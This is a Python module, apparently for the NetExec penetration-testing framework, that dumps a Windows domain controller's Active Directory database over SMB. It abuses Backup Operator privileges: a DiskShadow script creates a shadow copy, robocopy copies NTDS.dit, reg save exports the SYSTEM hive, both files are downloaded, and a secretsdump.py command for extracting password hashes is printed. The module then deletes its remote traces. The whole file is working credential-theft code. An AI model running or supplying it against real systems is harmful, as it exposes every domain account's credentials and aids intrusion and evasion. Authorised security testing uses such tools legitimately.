import os
import tempfile

from nxc.helpers.misc import CATEGORY, gen_random_string


class NXCModule:
    """
    Dump NTDS.dit via DiskShadow + VSS for Backup Operators
    Module by @AoD (GitHub issue #1366)
    """

    name = "ntds_diskshadow"
    description = "Dump NTDS.dit using DiskShadow and Volume Shadow Copy (Backup Operators)"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """Dump NTDS.dit using DiskShadow for users with SeBackupPrivilege (Backup Operators).

        Downloads ntds.dit and SYSTEM hive, then prints the secretsdump.py command to parse them locally.

        DRIVE_LETTER    Drive letter for the exposed shadow copy (default: Z)
        DIR_RESULT      Local directory to save the dumped files (default: auto temp dir)
        CLEANUP         Remove remote artifacts after download (default: True)
        """
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.rand = gen_random_string(8)
        self.cleanup = True

        self.drive_letter = module_options.get("DRIVE_LETTER", "Z").upper().rstrip(":")
        if len(self.drive_letter) != 1 or not self.drive_letter.isalpha():
            context.log.fail("DRIVE_LETTER must be a single letter (e.g. Z)")
            return False

        if "DIR_RESULT" in module_options:
            self.dir_result = os.path.abspath(module_options["DIR_RESULT"])
        else:
            self.dir_result = tempfile.mkdtemp(prefix="nxc_ntds_")

        if "CLEANUP" in module_options:
            self.cleanup = module_options["CLEANUP"].lower() not in ("false", "0", "no")

    def on_login(self, context, connection):
        # ── Step 1: Check SeBackupPrivilege ──
        context.log.display("Checking for SeBackupPrivilege...")
        priv_output = connection.execute("whoami /priv", True)
        context.log.debug(f"whoami /priv output: {priv_output}")

        if "SeBackupPrivilege" not in priv_output:
            context.log.fail("User does not have SeBackupPrivilege. Aborting.")
            return

        if "Disabled" in priv_output.split("SeBackupPrivilege")[1].split("\n")[0]:
            context.log.display("SeBackupPrivilege found but Disabled — DiskShadow will enable it implicitly")
        else:
            context.log.success("SeBackupPrivilege is Enabled")

        # ── Step 2: Write DiskShadow script ──
        dsh_filename = f"nxc_{self.rand}.dsh"
        dsh_remote_path = f"{self.tmp_dir}{dsh_filename}"

        dsh_content = (
            "set context persistent nowriters\n"
            "set metadata C:\\Windows\\Temp\\nxc_meta.cab\n"
            "begin backup\n"
            "add volume C: alias nxcVol\n"
            "create\n"
            f"expose %nxcVol% {self.drive_letter}:\n"
            "end backup\n"
        )

        context.log.display(f"Writing DiskShadow script to {dsh_remote_path}")
        # Use cmd echo to write the script line by line
        lines = dsh_content.strip().split("\n")
        # First line with > to create/overwrite, rest with >> to append
        cmd = f'cmd.exe /c "echo {lines[0]}> {dsh_remote_path}'
        for line in lines[1:]:
            cmd += f" & echo {line}>> {dsh_remote_path}"
        cmd += '"'
        context.log.debug(f"DiskShadow script write command: {cmd}")
        connection.execute(cmd, True)

        # ── Step 3: Execute DiskShadow ──
        context.log.display("Executing DiskShadow to create shadow copy...")
        context.log.highlight("This may take a moment, go grab a coffee...")

        diskshadow_cmd = f"diskshadow.exe /s {dsh_remote_path}"
        context.log.debug(f"DiskShadow command: {diskshadow_cmd}")
        ds_output = connection.execute(diskshadow_cmd, True)
        context.log.debug(f"DiskShadow output: {ds_output}")

        if ds_output and "error" in ds_output.lower() and "successfully" not in ds_output.lower():
            context.log.fail(f"DiskShadow may have failed: {ds_output}")
            self._cleanup_remote(context, connection, dsh_remote_path, shadow_created=False)
            return

        context.log.success(f"Shadow copy exposed on {self.drive_letter}:\\")

        # ── Step 4: Copy NTDS.dit via robocopy /B (backup semantics) ──
        ntds_remote_name = f"ntds_{self.rand}.dit"
        ntds_remote_path = f"{self.tmp_dir}{ntds_remote_name}"

        robocopy_cmd = (
            f'robocopy /B "{self.drive_letter}:\\Windows\\NTDS" "{self.tmp_dir}" ntds.dit '
            f"/copy:DAT /log:NUL /njh /njs"
        )
        context.log.display("Copying NTDS.dit from shadow copy using robocopy /B...")
        context.log.debug(f"Robocopy command: {robocopy_cmd}")
        robo_output = connection.execute(robocopy_cmd, True)
        context.log.debug(f"Robocopy output: {robo_output}")

        # Rename to our random name to avoid conflicts
        rename_cmd = f'cmd.exe /c "rename {self.tmp_dir}ntds.dit {ntds_remote_name}"'
        context.log.debug(f"Rename command: {rename_cmd}")
        connection.execute(rename_cmd, True)

        # ── Step 5: Save SYSTEM hive ──
        system_remote_name = f"SYSTEM_{self.rand}"
        system_remote_path = f"{self.tmp_dir}{system_remote_name}"

        reg_cmd = f'reg save HKLM\\SYSTEM "{system_remote_path}" /y'
        context.log.display("Saving SYSTEM hive...")
        context.log.debug(f"Reg save command: {reg_cmd}")
        reg_output = connection.execute(reg_cmd, True)
        context.log.debug(f"Reg save output: {reg_output}")

        # ── Step 6: Download files via SMB ──
        os.makedirs(self.dir_result, exist_ok=True)
        ntds_local_path = os.path.join(self.dir_result, "ntds.dit")
        system_local_path = os.path.join(self.dir_result, "SYSTEM")

        context.log.display(f"Downloading NTDS.dit to {ntds_local_path}")
        try:
            with open(ntds_local_path, "wb+") as f:
                connection.conn.getFile(
                    self.share,
                    f"{self.tmp_share}{ntds_remote_name}",
                    f.write,
                )
            context.log.success("NTDS.dit downloaded successfully")
        except Exception as e:
            context.log.fail(f"Failed to download NTDS.dit: {e}")
            self._cleanup_remote(context, connection, dsh_remote_path, shadow_created=True,
                                 files=[ntds_remote_path, system_remote_path])
            return

        context.log.display(f"Downloading SYSTEM hive to {system_local_path}")
        try:
            with open(system_local_path, "wb+") as f:
                connection.conn.getFile(
                    self.share,
                    f"{self.tmp_share}{system_remote_name}",
                    f.write,
                )
            context.log.success("SYSTEM hive downloaded successfully")
        except Exception as e:
            context.log.fail(f"Failed to download SYSTEM hive: {e}")
            self._cleanup_remote(context, connection, dsh_remote_path, shadow_created=True,
                                 files=[ntds_remote_path, system_remote_path])
            return

        # ── Step 7: Cleanup remote artifacts ──
        if self.cleanup:
            self._cleanup_remote(context, connection, dsh_remote_path, shadow_created=True,
                                 files=[ntds_remote_path, system_remote_path])

        # ── Step 8: Print secretsdump command ──
        context.log.success("NTDS.dit and SYSTEM hive dumped successfully!")
        context.log.highlight(f"Files saved to: {self.dir_result}")
        context.log.display("Parse the dump with secretsdump.py:")
        context.log.highlight(
            f"secretsdump.py -system '{system_local_path}' -ntds '{ntds_local_path}' LOCAL"
        )

    def _cleanup_remote(self, context, connection, dsh_path, shadow_created=False, files=None):
        """Remove remote artifacts: shadow copy, DiskShadow script, temp files."""
        context.log.display("Cleaning up remote artifacts...")

        # Delete the shadow copy
        if shadow_created:
            try:
                # Unexpose the drive letter first
                unexpose_script = f"nxc_unexpose_{self.rand}.dsh"
                unexpose_path = f"{self.tmp_dir}{unexpose_script}"
                unexpose_content = f"unexpose {self.drive_letter}:\n"

                write_cmd = f'cmd.exe /c "echo {unexpose_content.strip()}> {unexpose_path}"'
                connection.execute(write_cmd, True)
                ds_out = connection.execute(f"diskshadow.exe /s {unexpose_path}", True)
                context.log.debug(f"Unexpose output: {ds_out}")

                # Delete the unexpose script
                connection.execute(f'cmd.exe /c "del /f /q {unexpose_path}"', True)

                # Clean up VSS metadata
                connection.execute('cmd.exe /c "del /f /q C:\\Windows\\Temp\\nxc_meta.cab"', True)

                context.log.debug(f"Shadow copy on {self.drive_letter}:\\ unexposed")
            except Exception as e:
                context.log.debug(f"Error cleaning up shadow copy: {e}")
                context.log.fail(
                    "Could not remove shadow copy. Manually run: diskshadow.exe, then 'list shadows all' and 'delete shadows all'"
                )

        # Delete DiskShadow script
        try:
            connection.execute(f'cmd.exe /c "del /f /q {dsh_path}"', True)
            context.log.debug(f"Deleted {dsh_path}")
        except Exception as e:
            context.log.debug(f"Error deleting DiskShadow script: {e}")

        # Delete temp files (ntds.dit copy, SYSTEM hive copy)
        if files:
            for fpath in files:
                try:
                    connection.execute(f'cmd.exe /c "del /f /q {fpath}"', True)
                    context.log.debug(f"Deleted {fpath}")
                except Exception as e:
                    context.log.debug(f"Error deleting {fpath}: {e}")

        context.log.success("Remote cleanup completed")
